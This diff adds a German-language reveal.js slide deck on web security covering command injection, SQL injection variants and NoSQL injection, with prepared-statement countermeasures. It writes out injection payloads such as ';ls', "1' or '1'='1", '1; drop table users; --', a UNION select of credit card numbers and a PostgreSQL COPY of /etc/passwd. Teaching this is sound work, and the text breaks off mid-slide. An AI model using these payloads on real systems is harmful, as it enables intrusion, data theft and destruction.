@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="generator" content="pandoc">
+  <meta name="author" content="Andreas Happe">
+  <title>Web Security</title>
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
+  <link rel="stylesheet" href="https://unpkg.com/reveal.js@^4//dist/reset.css">
+  <link rel="stylesheet" href="https://unpkg.com/reveal.js@^4//dist/reveal.css">
+  <style>
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    span.underline{text-decoration: underline;}
+    div.column{display: inline-block; vertical-align: top; width: 50%;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    ul.task-list{list-style: none;}
+    pre > code.sourceCode { white-space: pre; position: relative; }
+    pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+    pre > code.sourceCode > span:empty { height: 1.2em; }
+    .sourceCode { overflow: visible; }
+    code.sourceCode > span { color: inherit; text-decoration: inherit; }
+    div.sourceCode { margin: 1em 0; }
+    pre.sourceCode { margin: 0; }
+    @media screen {
+    div.sourceCode { overflow: auto; }
+    }
+    @media print {
+    pre > code.sourceCode { white-space: pre-wrap; }
+    pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+    }
+    pre.numberSource code
+      { counter-reset: source-line 0; }
+    pre.numberSource code > span
+      { position: relative; left: -4em; counter-increment: source-line; }
+    pre.numberSource code > span > a:first-child::before
+      { content: counter(source-line);
+        position: relative; left: -1em; text-align: right; vertical-align: baseline;
+        border: none; display: inline-block;
+        -webkit-touch-callout: none; -webkit-user-select: none;
+        -khtml-user-select: none; -moz-user-select: none;
+        -ms-user-select: none; user-select: none;
+        padding: 0 4px; width: 4em;
+        color: #aaaaaa;
+      }
+    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
+    div.sourceCode
+      {   }
+    @media screen {
+    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+    }
+    code span.al { color: #ff0000; font-weight: bold; } /* Alert */
+    code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
+    code span.at { color: #7d9029; } /* Attribute */
+    code span.bn { color: #40a070; } /* BaseN */
+    code span.bu { } /* BuiltIn */
+    code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
+    code span.ch { color: #4070a0; } /* Char */
+    code span.cn { color: #880000; } /* Constant */
+    code span.co { color: #60a0b0; font-style: italic; } /* Comment */
+    code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
+    code span.do { color: #ba2121; font-style: italic; } /* Documentation */
+    code span.dt { color: #902000; } /* DataType */
+    code span.dv { color: #40a070; } /* DecVal */
+    code span.er { color: #ff0000; font-weight: bold; } /* Error */
+    code span.ex { } /* Extension */
+    code span.fl { color: #40a070; } /* Float */
+    code span.fu { color: #06287e; } /* Function */
+    code span.im { } /* Import */
+    code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
+    code span.kw { color: #007020; font-weight: bold; } /* Keyword */
+    code span.op { color: #666666; } /* Operator */
+    code span.ot { color: #007020; } /* Other */
+    code span.pp { color: #bc7a00; } /* Preprocessor */
+    code span.sc { color: #4070a0; } /* SpecialChar */
+    code span.ss { color: #bb6688; } /* SpecialString */
+    code span.st { color: #4070a0; } /* String */
+    code span.va { color: #19177c; } /* Variable */
+    code span.vs { color: #4070a0; } /* VerbatimString */
+    code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
+    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
+  </style>
+  <link rel="stylesheet" href="https://unpkg.com/reveal.js@^4//dist/theme/solarized.css" id="theme">
+  <link rel="stylesheet" href="custom.css"/>
+</head>
+<body>
+  <div class="reveal">
+    <div class="slides">
+
+<section id="title-slide">
+  <h1 class="title">Web Security</h1>
+  <p class="author">Andreas Happe</p>
+</section>
+
+<section>
+<section id="injection-attacks" class="title-slide slide level1">
+<h1>Injection Attacks</h1>
+
+</section>
+<section id="grundproblem" class="slide level2">
+<h2>Grundproblem</h2>
+<ul>
+<li>Garbage In/Garbage Out</li>
+<li>Never trust user (input)</li>
+<li>Switch von Daten-Context auf Befehls-Context
+<ul>
+<li>Ausführung am Web-, App- oder Datenbank-Server</li>
+<li>mit (hoffentlich) den entsprechenden Rechten</li>
+</ul></li>
+</ul>
+</section>
+<section id="wie-zu-testen" class="slide level2">
+<h2>Wie zu testen?</h2>
+<ul>
+<li>Gut automatisiert testbar
+<ul>
+<li>Web Application Security Scanner</li>
+<li>Tools für Spezialbereiche wie SQLi</li>
+</ul></li>
+</ul>
+</section>
+<section id="gegenmassnahmen" class="slide level2">
+<h2>Gegenmassnahmen</h2>
+<ul>
+<li>Überprüfung aller Eingaben
+<ul>
+<li>immer mit Bibliotheken da zu viele Möglichkeiten</li>
+</ul></li>
+<li>Quoting der Ausgaben/bei der Verwendung
+<ul>
+<li>teilweise automatisch durch Frameworks</li>
+</ul></li>
+<li>Minimize Impact
+<ul>
+<li>Sandboxes</li>
+<li>CSP</li>
+</ul></li>
+</ul>
+</section></section>
+<section id="problem-große-angriffsfläche" class="title-slide slide level1">
+<h1>Problem: Große Angriffsfläche</h1>
+
+</section>
+
+<section>
+<section id="command-injections" class="title-slide slide level1">
+<h1>Command Injections</h1>
+
+</section>
+<section id="allgemein" class="slide level2">
+<h2>Allgemein</h2>
+<ul>
+<li>Webapplikation mit dynamischer Web-Operation</li>
+<li>diese wird über ein Systemkommando breitgestellt</li>
+<li>Angreifer versucht das Kommando zu “überladen”..</li>
+<li>.. und kann dadurch “eigene” Kommandos ausführen</li>
+<li>use-case: mit netcat eine Session/Listener aufmachen</li>
+</ul>
+</section>
+<section id="beispiel-router-mit-ping" class="slide level2">
+<h2>Beispiel: Router mit Ping</h2>
+<p>http://192.168.1.1/test_connectivity?domain=snikt.net</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> os</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>domain <span class="op">=</span> user_input()</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>os.system(<span class="st">&#39;ping &#39;</span> <span class="op">+</span> domain)</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="co"># führt zu</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>ping snikt.net</span></code></pre></div>
+<pre><code># Versuche mit:
+;ls
+$(ls)
+`ls`
+
+# Ergebnis:
+ping www.snikt.net;ls</code></pre>
+</section>
+<section id="beispiel-tp-link-router" class="slide level2">
+<h2>Beispiel: TP-Link Router</h2>
+<ul>
+<li><a href="https://openwrt.org/toh/tp-link/tl-wr703n">Flash Instruction</a></li>
+</ul>
+</section>
+<section id="gefährliche-funktionen" class="slide level2">
+<h2>Gefährliche Funktionen</h2>
+<ul>
+<li>Java
+<ul>
+<li>Runtime.exec(), getRuntime.exec(), ProcessBuilder.start()</li>
+</ul></li>
+<li>PHP
+<ul>
+<li>system, shell_exec, exec, proc_open, eval, passthru, proc_open, expect_open, ssh2_exec, popen</li>
+</ul></li>
+<li>Python
+<ul>
+<li>exec, eval, os.system, os.popen, subprocess.popen, subprocess.call</li>
+</ul></li>
+</ul>
+</section>
+<section id="gegenmassnahme" class="slide level2">
+<h2>Gegenmassnahme</h2>
+<ul>
+<li>Bibliotheken statt Kommandozeilenaufrufe verwenden</li>
+<li>z.B. Netzwerkbibliotheken statt ping aufrufen</li>
+</ul>
+</section></section>
+<section>
+<section id="sql-injections" class="title-slide slide level1">
+<h1>SQL-Injections</h1>
+
+</section>
+<section id="grundproblem-owasp" class="slide level2">
+<h2>Grundproblem (OWASP)</h2>
+<pre><code>SQL injection errors occur when:
+  * Data enters a program from an untrusted source.
+  * The data used to dynamically construct a SQL query</code></pre>
+</section>
+<section id="sql-very-basics" class="slide level2">
+<h2>SQL: very basics</h2>
+<div class="sourceCode" id="cb4"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="kw">select</span> column1, column2 <span class="kw">from</span> table1, table2</span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="kw">where</span> column1 <span class="op">=</span> ‘xyz’</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="kw">order</span> <span class="kw">by</span> column1 <span class="kw">asc</span><span class="op">/</span><span class="kw">desc</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="kw">limit</span> <span class="dv">1</span>;</span></code></pre></div>
+</section>
+<section id="sql-union-select" class="slide level2">
+<h2>SQL: UNION select</h2>
+<div class="sourceCode" id="cb5"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">select</span> column1, column22 <span class="kw">from</span> table1, table2</span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="kw">where</span> conditions</span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="kw">order</span> <span class="kw">by</span> column1 <span class="kw">asc</span><span class="op">/</span><span class="kw">desc</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="kw">union</span> <span class="kw">all</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="kw">select</span> column3, column4 <span class="kw">from</span> table4, table5;</span></code></pre></div>
+</section>
+<section id="sql-injection-attacks" class="slide level2">
+<h2>SQL Injection Attacks</h2>
+</section>
+<section id="simples-beispiel" class="slide level2">
+<h2>Simples Beispiel</h2>
+<ul>
+<li>Kino-Portal:</li>
+<li>Login: https://kino.local/login.php?username=ah&amp;password=pw</li>
+</ul>
+<p>Hintergrund: SQL Operation wird mit String Concat gebaut</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a>query <span class="op">=</span> <span class="st">&quot;select * from users &quot;</span><span class="op">;</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>query <span class="op">=</span> query <span class="op">+</span> <span class="st">&quot;where username = &#39;&quot;</span> <span class="op">+</span>username <span class="op">+</span> <span class="st">&quot;&#39;&quot;</span><span class="op">;</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>query <span class="op">=</span> query <span class="op">+</span> <span class="st">&quot; and password = &#39;&quot;</span> <span class="op">+</span>password <span class="op">+</span><span class="st">&quot;&#39; limit 1;</span></span></code></pre></div>
+</section>
+<section id="simples-beispiel-1" class="slide level2">
+<h2>Simples Beispiel</h2>
+<p>Angreifer wählt Passwort:</p>
+<pre><code>1’ or ‘1’=’1</code></pre>
+<p>Ergebnis:</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="kw">select</span> <span class="op">*</span> <span class="kw">from</span> users </span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="kw">where</span> username <span class="op">=</span> ‘ah‘ <span class="kw">and</span> <span class="kw">password</span> <span class="op">=</span> ‘1’ <span class="kw">or</span> ‘1’ <span class="op">=</span> ‘1’ <span class="kw">limit</span> <span class="dv">1</span>;</span></code></pre></div>
+</section>
+<section id="stacked-queries" class="slide level2">
+<h2>Stacked Queries</h2>
+<div class="sourceCode" id="cb9"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a># URL</span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a>http:<span class="op">//</span>snikt.net<span class="op">/</span>test.php?<span class="kw">id</span><span class="op">=</span><span class="dv">1</span></span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a># Operation:</span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a><span class="kw">select</span> <span class="op">*</span> <span class="kw">from</span> articles <span class="kw">where</span> <span class="kw">id</span><span class="op">=</span><span class="dv">1</span></span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a># Eingabe</span>
+<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a><span class="dv">1</span>; <span class="kw">drop</span> <span class="kw">table</span> users; <span class="co">--</span></span>
+<span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-11"><a href="#cb9-11" aria-hidden="true" tabindex="-1"></a># Ergebnis</span>
+<span id="cb9-12"><a href="#cb9-12" aria-hidden="true" tabindex="-1"></a><span class="kw">select</span> <span class="op">*</span> <span class="kw">from</span> articles <span class="kw">where</span> <span class="kw">id</span><span class="op">=</span><span class="dv">1</span>;<span class="kw">drop</span> <span class="kw">table</span> users;<span class="co">--</span></span></code></pre></div>
+</section>
+<section id="union-based-sqli" class="slide level2">
+<h2>Union-Based SQLi</h2>
+<ul>
+<li>Weboberfläche</li>
+<li>https://snikt.net/addressbook_search?user_id=1</li>
+<li>Ergebnis wird in einer Tabelle angezeigt</li>
+</ul>
+<pre><code># Datenquelle:
+select Name, Phone, Address FROM users where user_id=1</code></pre>
+</section>
+<section id="union-based-sql-kommando" class="slide level2">
+<h2>Union-Based-SQL Kommando</h2>
+<ul>
+<li>Folgende Eingabe fuer id:</li>
+</ul>
+<pre><code>  1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable</code></pre>
+<ul>
+<li>Spaltenanzahl erraten</li>
+</ul>
+</section>
+<section id="union-based-sqli-ergebnis" class="slide level2">
+<h2>Union-Based SQLi: Ergebnis:</h2>
+<div class="sourceCode" id="cb12"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> Name, Phone, Address <span class="kw">FROM</span> Users <span class="kw">WHERE</span> <span class="kw">Id</span><span class="op">=</span><span class="dv">1</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="kw">UNION</span> <span class="kw">ALL</span></span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> creditCardNumber,<span class="dv">1</span>,<span class="dv">1</span> <span class="kw">FROM</span> CreditCardTable</span></code></pre></div>
+</section>
+<section id="error-based-sqli" class="slide level2">
+<h2>Error-based SQLi</h2>
+<p>Eine Datenbank-Fehlermeldung wird als Rückkanal verwendet</p>
+<div class="sourceCode" id="cb13"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a># <span class="kw">normal</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="kw">select</span> <span class="op">*</span> <span class="kw">from</span> <span class="kw">table</span> <span class="kw">where</span> <span class="kw">id</span> <span class="op">=</span> <span class="dv">1</span></span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a># angriff</span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a><span class="kw">select</span> <span class="op">*</span> <span class="kw">from</span> <span class="kw">table</span> <span class="kw">where</span> <span class="kw">id</span> <span class="op">=</span> (<span class="kw">select</span> username, <span class="kw">password</span> <span class="kw">from</span> users);</span>
+<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a># fehlermeldung:</span>
+<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a>Cannot compare <span class="kw">id</span> (<span class="dt">integer</span>) <span class="kw">with</span> [<span class="ot">&quot;root&quot;</span>, <span class="ot">&quot;password&quot;</span>]</span></code></pre></div>
+</section>
+<section id="beispiel-boolean-based-blind-sqli" class="slide level2">
+<h2>Beispiel: Boolean-based blind SQLi</h2>
+<ul>
+<li>URL: http://snikt.net/show_user?id=1</li>
+<li>Annahmen:
+<ul>
+<li>Query: select * from users where id = 1;</li>
+<li>id besitzt Injection-Lücke</li>
+<li>Aber kein Ausgabekanal in der Seite</li>
+</ul></li>
+</ul>
+</section>
+<section id="code-kann-angehängt-werden.." class="slide level2">
+<h2>Code kann angehängt werden..</h2>
+<div class="sourceCode" id="cb14"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a># <span class="kw">id</span>: <span class="ot">&quot;1 and 1=1&quot;</span> <span class="op">-&gt;</span> <span class="fu">user</span> wird angezeigt</span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="kw">select</span> <span class="op">*</span> <span class="kw">from</span> users <span class="kw">where</span> <span class="kw">id</span><span class="op">=</span><span class="dv">1</span> <span class="kw">and</span> <span class="dv">1</span><span class="op">=</span><span class="dv">1</span>;</span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a># <span class="kw">id</span>: <span class="ot">&quot;1 and 1=0&quot;</span> <span class="op">-&gt;</span> Kein Produkt wird angezeigt</span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a><span class="kw">select</span> <span class="op">*</span> <span class="kw">from</span> users <span class="kw">where</span> <span class="kw">id</span><span class="op">=</span><span class="dv">1</span> <span class="kw">and</span> <span class="dv">1</span><span class="op">=</span><span class="dv">0</span>;</span></code></pre></div>
+</section>
+<section id="beispiel-auslesen-der-ersten-stelle-eines-benutzernamens" class="slide level2">
+<h2>Beispiel: Auslesen der ersten Stelle eines Benutzernamens</h2>
+<div class="sourceCode" id="cb15"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="kw">FROM</span> Users</span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a><span class="kw">WHERE</span> <span class="kw">Id</span><span class="op">=</span><span class="dv">1</span> <span class="kw">AND</span> <span class="fu">ASCII</span>(SUBSTRING(username,<span class="dv">1</span>,<span class="dv">1</span>))<span class="op">=</span><span class="dv">97</span></span></code></pre></div>
+</section>
+<section id="bespiel-time-based-blind-sqli" class="slide level2">
+<h2>Bespiel: time-based blind SQLi</h2>
+<ul>
+<li>Kein Antwortkanal verfügbar</li>
+<li>Eigentlich ein Side-Channel Attack über Timing</li>
+<li>Operation: http://www.example.com/product.php?id=10</li>
+</ul>
+<div class="sourceCode" id="cb16"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a># <span class="kw">id</span>: <span class="ot">&quot;10 AND..&quot;</span></span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="kw">select</span> <span class="op">*</span> <span class="kw">from</span> products <span class="kw">where</span> <span class="kw">id</span><span class="op">=</span><span class="dv">10</span></span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a><span class="kw">AND</span> <span class="cf">IF</span>(version() <span class="kw">like</span> ‘<span class="dv">5</span>%’, sleep(<span class="dv">10</span>), ‘false’))<span class="co">--</span></span></code></pre></div>
+</section>
+<section id="tooling-sqlmap" class="slide level2">
+<h2>Tooling: SQLMap</h2>
+<ul>
+<li>Full support for MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, Informix, HSQLDB and H2 database management systems.</li>
+<li>Full support for five SQL injection techniques: boolean-based blind, time-based blind, error-based, UNION query-based and stacked queries.</li>
+</ul>
+</section>
+<section id="problem-database-escape" class="slide level2">
+<h2>Problem: Database-Escape</h2>
+<ul>
+<li>MySQL, PostgreSQL und MSSQL erlauben es, Kommandos ausgehend von SQL auszuführen</li>
+<li>z.B. xp_cmdshell bei MSSQL</li>
+</ul>
+<p>Postgresql (user muss db admin sein)</p>
+<div class="sourceCode" id="cb17"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a>postgres<span class="op">-</span># <span class="kw">CREATE</span> <span class="kw">TABLE</span> temp(t TEXT);</span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a>postgres<span class="op">-</span># <span class="kw">COPY</span> temp <span class="kw">FROM</span> <span class="st">&#39;/etc/passwd&#39;</span>;</span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a>postgres<span class="op">-</span># <span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> temp <span class="kw">limit</span> <span class="dv">1</span> offset <span class="dv">0</span>;</span></code></pre></div>
+</section>
+<section id="gegenmaßnahmen" class="slide level2">
+<h2>Gegenmaßnahmen</h2>
+</section>
+<section id="gegenmaßnahme-prepared-statement" class="slide level2">
+<h2>Gegenmaßnahme: Prepared Statement</h2>
+<div class="sourceCode" id="cb18"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="bu">String</span> custname <span class="op">=</span> request<span class="op">.</span><span class="fu">getParameter</span><span class="op">(</span><span class="st">&quot;customerName&quot;</span><span class="op">);</span></span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="bu">String</span> query <span class="op">=</span> <span class="st">&quot;SELECT account_balance FROM user_data WHERE user_name = ? &quot;</span><span class="op">;</span></span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a><span class="bu">PreparedStatement</span> pstmt <span class="op">=</span> connection<span class="op">.</span><span class="fu">prepareStatement</span><span class="op">(</span> query <span class="op">);</span></span>
+<span id="cb18-5"><a href="#cb18-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-6"><a href="#cb18-6" aria-hidden="true" tabindex="-1"></a>pstmt<span class="op">.</span><span class="fu">setString</span><span class="op">(</span> <span class="dv">1</span><span class="op">,</span> custname<span class="op">);</span></span>
+<span id="cb18-7"><a href="#cb18-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-8"><a href="#cb18-8" aria-hidden="true" tabindex="-1"></a><span class="bu">ResultSet</span> results <span class="op">=</span> pstmt<span class="op">.</span><span class="fu">executeQuery</span><span class="op">(</span> <span class="op">);</span></span></code></pre></div>
+</section>
+<section id="gegenmaßnahme-prepared-statements" class="slide level2">
+<h2>Gegenmaßnahme: Prepared Statements</h2>
+<div class="sourceCode" id="cb19"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="va">$id</span> <span class="op">=</span> <span class="dv">1</span><span class="ot">;</span></span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a><span class="va">$sth</span> <span class="op">=</span> <span class="va">$DBH</span>-&gt;prepare(<span class="st">&quot;SELECT * FROM juegos WHERE id = :id&quot;</span>)<span class="ot">;</span></span>
+<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a><span class="va">$sth</span>-&gt;bindParam(<span class="st">&#39;:id&#39;</span><span class="ot">,</span> <span class="va">$id</span><span class="ot">,</span> <span class="bu">PDO</span>::<span class="cn">PARAM_INT</span>)<span class="ot">;</span></span>
+<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a><span class="va">$STH</span>-&gt;execute()<span class="ot">;</span></span></code></pre></div>
+</section>
+<section id="gegenmaßnahme-prepared-statements-1" class="slide level2">
+<h2>Gegenmaßnahme: prepared statements</h2>
+<ul>
+<li>Achtung: einige Felder können nicht mittels Prepared Statements abgebildet werden:
+<ul>
+<li>Tabellennamen</li>
+<li>Spaltennamen</li>
+<li>ASC/DESC</li>
+</ul></li>
+<li>In dem Fall: Whitelisting oder Query umbauen</li>
+</ul>
+</section>
+<section id="gegenmaßnahme-prepared-statements-2" class="slide level2">
+<h2>Gegenmaßnahme: prepared statements</h2>
+<ul>
+<li>Vorteil von prepared statements: Logik bleibt in der Applikation</li>
+</ul>
+</section>
+<section id="gegenmaßnahme-escape-input-data" class="slide level2">
+<h2>Gegenmaßnahme: Escape Input Data</h2>
+<ul>
+<li>Last-Resort</li>
+<li>Error-Prone</li>
+<li>Datenbank-spezifisch</li>
+</ul>
+</section>
+<section id="stored-procedures" class="slide level2">
+<h2>Stored Procedures?</h2>
+<ul>
+<li>Können sicher sein, weil stored procedures meistens prepared statements verwenden</li>
+<li>Es gibt aber auch die Möglichkeit eines evals, deswegen muss man den stored procedure code ebenso testen</li>
+</ul>
+</section>
+<section id="orms-sind-automatisch-sicher" class="slide level2">
+<h2>ORMs sind automatisch sicher?</h2>
+<p>Am Beispiel sqlize</p>
+<div class="sourceCode" id="cb20"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a># example</span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a>models<span class="op">.</span><span class="at">Items</span><span class="op">.</span><span class="fu">findAll</span>({</span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">limit</span><span class="op">:</span> <span class="st">&#39;1&#39;</span><span class="op">,</span></span>
+<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a>})</span>
+<span id="cb20-5"><a href="#cb20-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-6"><a href="#cb20-6" aria-hidden="true" tabindex="-1"></a># not so perfect</span>
+<span id="cb20-7"><a href="#cb20-7" aria-hidden="true" tabindex="-1"></a>models<span class="op">.</span><span class="at">Items</span><span class="op">.</span><span class="fu">findAll</span>({</span>
+<span id="cb20-8"><a href="#cb20-8" aria-hidden="true" tabindex="-1"></a>  <span class="dt">limit</span><span class="op">:</span> <span class="st">&#39;1; DROP TABLE Items; --&#39;</span><span class="op">,</span></span>
+<span id="cb20-9"><a href="#cb20-9" aria-hidden="true" tabindex="-1"></a>})</span></code></pre></div>
+</section>
+<section id="nosql-mongodb" class="slide level2">
+<h2>NoSQL? MongoDB</h2>
+<div class="sourceCode" id="cb21"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a># example</span>
+<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a>db<span class="op">.</span><span class="at">myCollection</span><span class="op">.</span><span class="fu">find</span>({</span>
+<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">active</span><span class="op">:</span> <span class="kw">true</span><span class="op">,</span></span>
+<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">$where</span><span class="op">:</span> <span class="kw">function</span>() {</span>
+<span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> obj<span class="op">.</span><span class="at">credits</span> <span class="op">-</span> obj<span class="op">.</span><span class="at">debits</span> <span class="op">&lt;</span> $userInput<span class="op">;</span></span>
+<span id="cb21-6"><a href="#cb21-6" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb21-7"><a href="#cb21-7" aria-hidden="true" tabindex="-1"></a>})<span class="op">;;</span></span></code></pre></div>
+</section>
+<section id="nosql-attack-pattern" class="slide level2">
+<h2>NoSQL: Attack pattern</h2>
+<div class="sourceCode" id="cb22"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a># attack<span class="op">:</span> $userInput auf folgenden Wert setzen</span>
